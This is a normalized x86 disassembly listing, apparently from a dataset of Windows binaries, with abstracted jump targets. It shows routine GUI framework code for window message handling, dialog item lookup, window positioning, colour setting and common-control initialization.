push 0xffffffff
push ebx
push 0xf107
call sub_412883
sub_4107a9
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
mov [ ebp + 0x8 ] eax
cmp eax [ ebx ]
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
add ebx 0x18
jmp r-xdata
cmp ecx [ ebx + 0x8 ]
jb r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp ecx [ ebx + 0xc ]
ja r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x10
sub_4107e9
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push ecx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x9c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0xa0 ]
mov [ ebp - 0x4 ] eax
sub_41082d
mov eax sub_413b18
call sub_40d394
sub esp 0x54
and [ ebp - 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
cmp ebx 0x111
mov edi ecx
jne r-xdata
cmp ebx 0x4e
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ edi ]
push [ ebp + 0xc ]
call [ eax + 0x78 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
cmp ebx 0x6
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp ebx 0x20
jne r-xdata
push esi
call sub_40fa9e
push eax
push [ ebp + 0xc ]
push edi
call sub_40f806
mov edx [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp + 0xc ]
mov ecx edi
call [ edx + 0x7c ]
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ebx eax
mov eax 0x1ff
and ebx eax
and ecx eax
push 0x7
xor ebx ecx
call sub_413236
mov ecx [ ebp + 0x8 ]
lea eax [ ebx + ebx * 2 ]
cmp ecx [ eax * 4 + rw-data ]
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
jne r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push edi
call sub_40f867
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
mov [ ebx ] ecx
mov [ ebx + 0x8 ] eax
je r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
and [ ebx + 0x4 ] 0x0
push 0x7
call sub_4132a6
jmp r-xdata
mov ebx [ ebx + 0x4 ]
push 0x7
mov [ ebp + 0x10 ] ebx
call sub_4132a6
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov edx 0xc000
cmp ecx edx
jae r-xdata
cmp [ ebp + 0x8 ] 0xc000
jb r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push 0x0
push edx
push eax
call sub_4107a9
test eax eax
mov [ ebp + 0x10 ] eax
je r-xdata
push 0x0
push 0x0
push ecx
push [ eax + 0x4 ]
call sub_4107a9
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx + 0x14 ]
cmp [ ecx + 0x8 ] 0x1a
mov eax [ ecx + 0x10 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
jmp r-xdata
push 0x7
mov [ ebx + 0x4 ] eax
call sub_4132a6
mov ebx [ ebp + 0x10 ]
jmp r-xdata
dec eax
cmp eax 0x30
ja r-xdata
call [ GetVersion@IAT ]
mov ecx [ ebp + 0x10 ]
cmp al 0x4
sbb eax eax
and al 0xf0
add eax 0x2f
mov ebx [ ebx + 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
cmp [ ecx ] edx
je r-xdata
jmp [ eax * 4 + jump_table_410cdb ]
push 0x7
mov [ ebx + 0x4 ] eax
call sub_4132a6
mov ebx [ ebp + 0x10 ]
push 0x0
push 0x0
add eax 0x18
push 0xc000
push eax
call sub_4107a9
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
push [ ebp + 0xc ]
call sub_412268
push eax
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push [ ebp + 0xc ]
call sub_40fa9e
jmp r-xdata
push esi
push [ ebp + 0xc ]
call sub_40fa9e
jmp r-xdata
lea ecx [ ebp - 0x24 ]
call sub_4121c6
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
call sub_40f700
mov eax [ esi ]
mov esi [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x44 ] eax
call sub_40fac5
test eax eax
jne r-xdata
lea ecx [ ebp - 0x24 ]
call sub_4121c6
mov eax [ esi + 0x4 ]
push [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call ebx
and [ ebp - 0x20 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_40fa9e
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push esi
push esi
call sub_411f98
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
movsx eax ax
push eax
movsx eax si
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
push [ ebp + 0xc ]
call sub_40fa9e
push eax
push esi
call sub_40fa9e
push eax
xor eax eax
cmp [ edi + 0x1c ] esi
sete al
push [ ebp + 0xc ]
call sub_412268
push [ ebp + 0xc ]
call sub_411f98
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
push eax
push [ ebp + 0xc ]
call sub_411f98
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
push esi
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
push [ ebp + 0xc ]
call sub_40fa9e
jmp r-xdata
push esi
call sub_40fa9e
push eax
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_40fa9e
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx edx ax
shr eax 0x10
cmp [ ecx + 0x10 ] 0x1d
mov [ ebp + 0x8 ] edx
movsx eax ax
mov [ ebp + 0xc ] eax
jne r-xdata
push esi
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
mov ecx edi
call ebx
jmp r-xdata
push esi
mov eax [ ebp + 0xc ]
push esi
shr eax 0x10
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
mov ecx edi
push [ ebp + 0xc ]
call ebx
movzx eax si
shr esi 0x10
push esi
push eax
mov eax [ ebp + 0xc ]
mov ecx edi
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
call ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
push esi
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx edi
call ebx
jmp r-xdata
push eax
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
call ebx
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
call sub_410110
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
jmp r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
push eax
movzx eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx edi
call ebx
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push eax
jmp r-xdata
call sub_40fa9e
jmp r-xdata
push eax
push [ ebp + 0xc ]
call sub_40fa9e
jmp r-xdata
push eax
jmp r-xdata
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push eax
push edx
jmp r-xdata
push esi
call sub_40fa9e
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jmp r-xdata
mov ecx edi
call ebx
test eax eax
jne r-xdata
call sub_4122ae
jmp r-xdata
lea eax [ ebp - 0x60 ]
push [ ebp - 0x44 ]
lea ecx [ eax + 0x20 ]
call sub_40eb46
test eax eax
je r-xdata
mov [ ebp - 0x28 ] eax
sub_410dc9
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx edi ax
xor ebx ebx
mov esi ecx
shr eax 0x10
cmp [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
push sub_412a04
mov ecx rw-data
call sub_412d34
mov eax [ eax + 0xb8 ]
cmp eax [ esi + 0x1c ]
je r-xdata
cmp edi ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
push ebx
push [ ebp + 0xc ]
call sub_41108a
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_410d9f
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push 0xffffffff
push edi
mov ecx esi
mov [ ebp - 0x28 ] edi
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp edi ebx
jne r-xdata
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
push ebx
push ebx
mov ecx esi
push [ ebp + 0x8 ]
push edi
call [ eax + 0xc ]
sub_410e55
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
mov ebx [ esi ]
push ebx
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
push sub_412a04
mov ecx rw-data
mov [ ebp + 0xc ] eax
call sub_412d34
mov eax [ eax + 0xb8 ]
cmp eax [ edi + 0x1c ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
push [ ebp + 0x10 ]
push ebx
call sub_41108a
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xc ]
push 0x0
push ecx
movzx ecx [ ebp + 0xc ]
or ecx 0x4e0000
mov [ ebp - 0xc ] eax
mov eax [ edi ]
push ecx
push [ ebp - 0x4 ]
mov ecx edi
mov [ ebp - 0x8 ] esi
call [ eax + 0xc ]
sub_410ecf
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_40fac5
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov ecx eax
call sub_40cc7f
test eax eax
je r-xdata
push 0x4
push esi
call [ GetWindow@IAT ]
push esi
call [ GetParent@IAT ]
jmp r-xdata
pop esi
retn 0x4
mov eax [ eax + 0x1c ]
jmp r-xdata
sub_410f14
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
push esi
mov esi eax
push esi
push esi
call sub_40fa9e
pop esi
retn
mov esi eax
push eax
jmp r-xdata
call sub_410ecf
test eax eax
je r-xdata
sub_410f3c
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetDlgItem@IAT ]
mov edi [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call edi
push esi
call edi
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_410f3c
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_410f3c
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
call sub_40fac5
test eax eax
jne r-xdata
call sub_40fa9e
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
sub_410fb5
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi [ GetTopWindow@IAT ]
call edi
pop edi
pop esi
pop ebp
retn 0x18
cmp [ ebp + 0x1c ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ SendMessageA@IAT ]
push esi
call sub_40fac5
test eax eax
je r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push eax
call sub_40f8dd
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_410fb5
sub_411032
push esi
mov esi ecx
call sub_411cd4
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
push 0x0
mov ecx esi
call sub_411cba
push eax
push [ esp + 0x14 ]
call [ AdjustWindowRectEx@IAT ]
pop esi
retn 0x8
and ah 0xfd
sub_41105d
push esi
mov esi ecx
push sub_412a04
mov ecx rw-data
call sub_412d34
push [ esp + 0x8 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x40 ]
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa8 ]
pop esi
retn 0x4
sub_41108a
mov eax sub_413b2c
call sub_40d394
sub esp 0x3c
push esi
push edi
push 0x0
call sub_40fa2c
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ eax + 0x4 ]
push edi
mov ecx esi
call sub_40eb46
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push [ ebp + 0xc ]
mov ecx eax
call sub_41105d
push edi
call [ GetParent@IAT ]
push eax
mov ecx esi
call sub_40eb46
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
push edi
lea ecx [ eax + 0x20 ]
call sub_40eb46
mov esi eax
test esi esi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
call sub_40f73e
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] esi
call sub_41105d
and [ ebp - 0x2c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
mov esi eax
call sub_410110
mov eax esi
jmp r-xdata
sub_41112e
push ebp
mov ebp esp
cmp [ ecx + 0x38 ] 0x0
push esi
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411189
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x2000 ]
push eax
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
cmp esi 0x132
jb r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
cmp esi 0x138
ja r-xdata
push 0x1
pop eax
jmp r-xdata
mov [ ecx ] eax
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x10
sub_411189
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov edx 0x111
cmp eax edx
push esi
ja r-xdata
cmp eax 0x114
jb r-xdata
je r-xdata
cmp eax 0x132
jb r-xdata
cmp eax 0x115
jbe r-xdata
mov eax [ ebp + 0xc ]
xor esi esi
shr eax 0x10
push esi
or eax 0xbd110000
push esi
push eax
push esi
call sub_40f2bf
test eax eax
je r-xdata
cmp eax 0x2b
jb r-xdata
xor eax eax
cmp eax 0x138
ja r-xdata
push [ ebp + 0x14 ]
add eax 0xbc00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41082d
jmp r-xdata
cmp eax 0x210
jne r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
cmp ecx esi
pop eax
je r-xdata
cmp eax 0x2f
jbe r-xdata
mov edx [ ebp + 0xc ]
add eax 0xfffffece
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push edi
xor esi esi
push eax
push esi
push 0xbc19
mov [ ebp - 0x8 ] edx
call sub_41082d
cmp [ edi ] esi
pop edi
jne r-xdata
pop esi
leave
retn 0x10
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x39
je r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
mov edx [ eax + 0x8 ]
xor esi esi
lea eax [ ebp - 0x8 ]
push esi
push eax
movzx eax dx
or eax 0xbc4e0000
push eax
push esi
call sub_40f2bf
jmp r-xdata
sub_411271
cmp [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
push 0x0
push [ esp + 0x10 ]
call sub_41108a
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x2
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_40fa05
sub_4112c0
push esi
mov esi ecx
call sub_413126
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_413126
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
mov ecx esi
call sub_411cba
test eax 0x40000000
jne r-xdata
call sub_40f15e
test eax eax
je r-xdata
mov ecx rw-data
call sub_411ddd
mov ecx esi
call sub_40fa05
pop esi
retn
push 0x1
push 0x1
push 0x0
push 0x0
push 0x15
push [ esi + 0x1c ]
call sub_410fb5
call sub_40f15e
cmp [ eax + 0x1c ] esi
jne r-xdata
push sub_4131c1
mov ecx rw-data
call sub_412dc9
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
call eax
sub_41133d
push esi
push edi
mov edi ecx
call sub_413126
cmp [ eax + 0x14 ] 0x0
jne r-xdata
and [ rw-data ] 0x0
push 0x0
push 0x0
mov ecx edi
call sub_41143f
pop edi
pop esi
retn 0x8
push sub_4131c1
mov ecx rw-data
call sub_412dc9
mov esi eax
call sub_40f15e
test eax eax
je r-xdata
call sub_40f15e
cmp [ eax + 0x1c ] edi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
call eax
sub_411390
push esi
mov esi ecx
call sub_413126
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_411cba
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
pop esi
retn 0x4
call sub_40f9d0
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_410fb5
push [ esp + 0x8 ]
mov ecx eax
call sub_411e79
sub_4113db
push ebx
push esi
push edi
mov ebx ecx
call sub_411cba
test eax 0x40000000
jne r-xdata
mov ecx ebx
call sub_40fa05
call sub_40c91f
mov esi eax
test esi esi
je r-xdata
mov edi [ GetKeyState@IAT ]
push 0x10
call edi
test ax ax
jl r-xdata
push 0x11
call edi
test ax ax
jl r-xdata
push 0x12
call edi
test ax ax
jl r-xdata
push 0x0
push 0xe146
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_41143f
push esi
mov esi ecx
call sub_40c91f
cmp eax esi
jne r-xdata
mov ecx esi
call sub_411cba
test eax 0x40000000
jne r-xdata
mov ecx rw-data
call sub_411e21
mov ecx esi
call sub_40fa05
pop esi
retn 0x8
call sub_40f9d0
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_410fb5
sub_411488
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x4 ]
call sub_41108a
test eax eax
je r-xdata
mov ecx esi
call sub_40fa05
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_4114b2
push esi
mov esi ecx
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_40fa05
push 0x0
call sub_41105d
test eax eax
jne r-xdata
pop esi
retn 0xc
sub_4114d3
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ PeekMessageA@IAT ]
mov esi 0x121
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
mov ebx ecx
push eax
mov ecx ebx
call sub_40fa05
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
call edi
test eax eax
je r-xdata
sub_41151d
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
call sub_41105d
test eax eax
je r-xdata
mov ecx esi
call sub_40fa05
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_411544
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
je r-xdata
test eax eax
je r-xdata
cmp eax 0x5
je r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xc
push [ ebp + 0x14 ]
call [ GetObjectA@IAT ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ SetBkColor@IAT ]
mov eax [ ebp + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
push eax
push [ ebp + 0xc ]
call sub_41200e
test eax eax
je r-xdata
push eax
push [ ebp + 0x8 ]
call [ SetTextColor@IAT ]
push 0x1
pop eax
jmp r-xdata
push 0x8
call [ GetSysColor@IAT ]
leave
retn 0x14
sub_4115b9
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_411cba
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp - 0x1 ] 0x40
je r-xdata
mov edi [ eax + 0x1c ]
jmp r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push [ esi + 0x1c ]
call [ GetParent@IAT ]
jmp r-xdata
mov ebx [ GetWindowRect@IAT ]
lea eax [ ebp - 0x28 ]
push eax
push [ esi + 0x1c ]
call ebx
test [ ebp - 0x1 ] 0x40
jne r-xdata
push 0x0
push 0x0
push 0x36b
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
mov esi [ GetClientRect@IAT ]
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call esi
lea eax [ ebp - 0x38 ]
push eax
push edi
call esi
lea eax [ ebp - 0x38 ]
push 0x2
push eax
push ebx
push edi
call [ MapWindowPoints@IAT ]
test edi edi
je r-xdata
mov edi eax
mov eax [ ebp - 0x10 ]
add edi ecx
cmp edi eax
jle r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
test edi edi
mov [ ebp - 0x60 ] 0x28
jne r-xdata
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
cmp esi [ ebp - 0x14 ]
jge r-xdata
sub eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
mov ecx eax
lea eax [ ebp - 0x38 ]
push eax
push edi
call ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x2
push edi
call sub_40cb81
push eax
call sub_40cbec
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ CopyRect@IAT ]
jmp r-xdata
call sub_40c91f
test eax eax
je r-xdata
xor edi edi
test eax 0x20000000
je r-xdata
add ebx esi
cmp ebx [ ebp - 0xc ]
jle r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x20 ]
add eax ecx
sub edi [ ebp - 0x28 ]
mov ebx [ ebp - 0x1c ]
cdq
sub eax edx
sub ebx [ ebp - 0x24 ]
mov ecx eax
mov eax edi
cdq
sub eax edx
mov edx [ ebp - 0x2c ]
sar ecx 0x1
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x34 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax ebx
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
cmp ecx [ ebp - 0x18 ]
jge r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
push eax
call sub_40cb81
push eax
call sub_40cbec
mov esi [ CopyRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
jmp r-xdata
mov eax [ eax + 0x1c ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
mov ecx [ ebp - 0x8 ]
push 0x0
call sub_411cee
pop edi
pop esi
pop ebx
leave
retn 0x4
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x1c ]
add esi [ ebp - 0xc ]
sub_411775
mov eax [ esp + 0x4 ]
mov [ ecx + 0x2c ] eax
mov eax [ ecx + 0x24 ]
test al 0x10
je r-xdata
retn 0x4
and al 0xef
mov [ ecx + 0x24 ] eax
xor eax eax
push eax
push eax
push eax
push [ ecx + 0x1c ]
call [ PostMessageA@IAT ]
sub_411799
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov [ esi + 0x24 ] eax
call sub_413126
movzx ecx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
mov edi [ LoadIconA@IAT ]
push ecx
push eax
call edi
test eax eax
mov [ esi + 0x14 ] eax
jne r-xdata
push esi
call sub_4105da
pop edi
pop esi
retn 0xc
push 0x7f00
push eax
call edi
mov [ esi + 0x14 ] eax
sub_4117da
push ebx
push esi
mov esi r--data
push edi
push esi
call [ GetModuleHandleA@IAT ]
push esi
mov edi eax
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push r--data
push ebx
xor esi esi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call eax
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edi 0x3fc0
and eax edi
cmp eax [ esp + 0x14 ]
jne r-xdata
push ebx
call [ FreeLibrary@IAT ]
mov eax esi
mov esi [ esp + 0x14 ]
test edi edi
jne r-xdata
call [ InitCommonControls@IAT ]
mov esi edi
jmp r-xdata
call [ InitCommonControls@IAT ]
or si 0x3fc0
sub_411851
push ebp
mov ebp esp
sub esp 0x34
call sub_413126
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x18 ]
not eax
and [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push esi
push edi
xor edi edi
push 0x28
lea eax [ ebp - 0x34 ]
push edi
push eax
xor esi esi
call sub_4087f0
mov eax [ DefWindowProcA@IAT ]
add esp 0xc
mov [ ebp - 0x30 ] eax
call sub_413126
mov eax [ eax + 0x8 ]
push 0x8
test [ ebp + 0x8 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
pop ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] 0xb
push eax
mov [ ebp - 0x10 ] r--data
call sub_4105da
test eax eax
je r-xdata
leave
retn 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
or [ ebp - 0x34 ] 0x8b
